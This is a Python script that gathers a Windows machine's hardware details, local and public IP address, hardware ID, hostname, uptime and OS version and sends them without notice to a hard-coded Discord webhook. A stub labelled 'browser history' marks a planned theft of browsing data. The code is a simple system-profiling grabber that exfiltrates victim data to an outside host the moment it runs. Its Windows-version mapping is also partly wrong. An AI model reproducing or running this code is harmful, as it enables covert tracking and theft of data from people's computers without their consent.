import psutil
import requests
import json
import uuid
import socket
import subprocess
import os
import platform
from datetime import datetime, timedelta

def get_gpu_info():
    try:
        result = subprocess.run(
            ["wmic", "path", "win32_videocontroller", "get", "name"],
            capture_output=True,
            text=True
        )
        gpus = [line.strip() for line in result.stdout.split("\n") if line.strip() and "Name" not in line]
        return gpus
    except Exception as e:
        return [f"Error retrieving GPU info: {e}"]

def get_local_ip_address():
    ip_address = "N/A"
    try:
        interfaces = psutil.net_if_addrs()
        for interface, addrs in interfaces.items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    ip_address = addr.address
                    break
    except Exception as e:
        ip_address = f"Error retrieving local IP address: {e}"
    
    return ip_address

def get_public_ip_address():
    try:
        response = requests.get("https://api.ipify.org?format=json")
        public_ip = response.json().get("ip", "N/A")
        return public_ip
    except Exception as e:
        return f"Error retrieving public IP address: {e}"

def get_monitor_info():
    try:
        result = subprocess.run(
            ["wmic", "desktopmonitor", "get", "caption,screenheight,screenwidth"],
            capture_output=True,
            text=True
        )
        lines = result.stdout.split("\n")
        monitors = []
        for line in lines[1:]:
            parts = line.split()
            if len(parts) >= 3:
                caption = " ".join(parts[:-2])
                screen_width = parts[-2]
                screen_height = parts[-1]
                monitors.append({
                    "caption": caption,
                    "screen_width": screen_width,
                    "screen_height": screen_height
                })
        return monitors
    except Exception as e:
        return [f"Error retrieving monitor info: {e}"]

def get_system_uptime():
    uptime_seconds = (datetime.now() - datetime.fromtimestamp(psutil.boot_time())).total_seconds()
    uptime = str(timedelta(seconds=uptime_seconds))
    return uptime

def get_os_info():
    os_info = {
        "name": platform.system(),
        "version": platform.version(),
        "architecture": platform.architecture()[0],
        "build": platform.win32_ver()[1] if platform.system() == 'Windows' else 'N/A'
    }
    
    if os_info["name"] == "Windows":
        try:
            import win32api
            version_info = win32api.GetVersionEx()
            if version_info[0] == 5 and version_info[1] == 1:
                os_info["name"] = "Windows XP"
            elif version_info[0] == 5 and version_info[1] == 2:
                os_info["name"] = "Windows Server 2003"
            elif version_info[0] == 6 and version_info[1] == 0:
                os_info["name"] = "Windows Vista"
            elif version_info[0] == 6 and version_info[1] == 1:
                os_info["name"] = "Windows 7"
            elif version_info[0] == 6 and version_info[1] == 2:
                os_info["name"] = "Windows 8"
            elif version_info[0] == 6 and version_info[1] == 3:
                os_info["name"] = "Windows 8.1"
            elif version_info[0] == 10:
                if version_info[1] == 0:
                    os_info["name"] = "Windows 10"
                elif version_info[1] == 1:
                    os_info["name"] = "Windows 11"
            else:
                os_info["name"] = "Unknown Windows Version"
        except ImportError:
            pass
    
    return os_info

def get_system_info():
    cpu_info = {
        "physical_cores": psutil.cpu_count(logical=False),
        "total_cores": psutil.cpu_count(logical=True),
        "frequency": psutil.cpu_freq().current,
        "usage": psutil.cpu_percent(interval=1)
    }
    svmem = psutil.virtual_memory()
    ram_info = {
        "total": svmem.total,
        "available": svmem.available,
        "used": svmem.used,
        "percentage": svmem.percent
    }
    gpu_info = get_gpu_info()
    local_ip_address = get_local_ip_address()
    public_ip_address = get_public_ip_address()
    monitor_info = get_monitor_info()
    hwid = str(uuid.UUID(int=uuid.getnode()))
    desktop_name = socket.gethostname()
    uptime = get_system_uptime()
    os_info = get_os_info()
    
    return {
        "cpu": cpu_info,
        "ram": ram_info,
        "gpus": gpu_info,
        "local_ip": local_ip_address,
        "public_ip": public_ip_address,
        "monitors": monitor_info,
        "gci": {
            "hwid": hwid,
            "uuid": uuid.uuid4(),
            "desktop_name": desktop_name,
            "public_ip": public_ip_address,
            "uptime": uptime
        },
        "os": os_info,
        "browser_history": "Incomplete Feature"
    }

def send_discord_message(webhook_url, system_info):
    embed = {
        "title": "Surface Information",
        "fields": [
            {"name": "CPU",
             "value": f"Physical cores: {system_info['cpu']['physical_cores']}\n"
                      f"Total cores: {system_info['cpu']['total_cores']}\n"
                      f"Frequency: {system_info['cpu']['frequency']} MHz\n"
                      f"Usage: {system_info['cpu']['usage']}%"},
            {"name": "RAM",
             "value": f"Total: {system_info['ram']['total'] // (1024 ** 3)} GB\n"
                      f"Available: {system_info['ram']['available'] // (1024 ** 3)} GB\n"
                      f"Used: {system_info['ram']['used'] // (1024 ** 3)} GB\n"
                      f"Percentage: {system_info['ram']['percentage']}%"},
            {"name": "GPUs",
             "value": "\n".join([f"GPU: {gpu}" for gpu in system_info['gpus']])},
            {"name": "Monitors",
             "value": "\n".join([f"Caption: {monitor['caption']}\n"
                                 f"Resolution: {monitor['screen_width']}x{monitor['screen_height']}\n"
                                 for monitor in system_info['monitors']])},
            {"name": "General Computer Information (GCI)",
             "value": f"HWID: {system_info['gci']['hwid']}\n"
                      f"UUID: {system_info['gci']['uuid']}\n"
                      f"Desktop Name: {system_info['gci']['desktop_name']}\n"
                      f"Public IP Address: {system_info['gci']['public_ip']}\n"
                      f"System Uptime: {system_info['gci']['uptime']}"},
            {"name": "OS Info",
             "value": f"Name: {system_info['os']['name']}\n"
                      f"Version: {system_info['os']['version']}\n"
                      f"Architecture: {system_info['os']['architecture']}\n"
                      f"Build: {system_info['os']['build']}"},
            {"name": "Browser History",
             "value": f"Download your browser history from the following link:\n{["Incomplete Feature"]}"}
        ]
    }
    
    data = {
        "embeds": [embed]
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
    
    if response.status_code == 204:
        print("Message sent successfully.")
    else:
        print(f"Failed to send message. Response code: {response.status_code}")
        print(response.text)
webhook_url = 'https://discord.com/api/webhooks/1263977760423149750/fjwjdCLAzyJiqpnlnGWGK-lXnluLVCUgKsSQINhCHuOf2ZjRD0DPTGmDYdqN21aHcQJV'
system_info = get_system_info()
send_discord_message(webhook_url, system_info)
